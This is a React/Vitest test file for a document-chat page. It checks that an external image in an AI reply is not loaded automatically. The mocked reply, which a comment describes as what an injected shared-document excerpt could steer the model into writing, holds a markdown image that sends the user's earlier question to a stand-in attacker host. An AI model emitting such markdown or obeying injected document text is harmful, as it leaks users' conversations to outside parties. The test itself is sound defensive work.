import { screen } from "@testing-library/react";
import { useState } from "react";
import { describe, expect, it, vi } from "vitest";

import type { ChatMsg } from "@/lib/useMentorSocket";
import { renderPage } from "@/test/render";

import DocumentsPage from "./Documents";

vi.mock("@/lib/api", async (orig) => ({
  ...(await orig<typeof import("@/lib/api")>()),
  api: vi.fn(async (path: string) =>
    path === "/api/docs/" ? [{ id: 4, title: "Shared policy", filename: "p.pdf", kind: "pdf", pages: 2, chars: 100 }] : path === "/api/orgs/me/documents/" ? [] : null),
}));

// The reply an injected org-shared excerpt could steer the model into writing.
const leak = "Sure! ![x](https://evil.example/log?q=my+earlier+question)";
vi.mock("@/lib/useMentorSocket", () => ({
  useMentorSocket: () => {
    const [messages, setMessages] = useState<ChatMsg[]>([{ id: 1, role: "assistant", content: leak }]);
    return { status: "ready", messages, setMessages, busy: false, error: null, send: () => false, cancel: () => {} };
  },
}));

describe("Document chat (S31)", () => {
  it("does not auto-load an external image in an AI reply about a shared document", async () => {
    const { container } = renderPage(<DocumentsPage />, { route: "/documents/4", path: "/documents/:id" });
    expect(await screen.findByRole("button", { name: /Load image from evil\.example/ })).toBeInTheDocument();
    expect(container.querySelector('img[src*="evil.example"]')).toBeNull();
  });
});
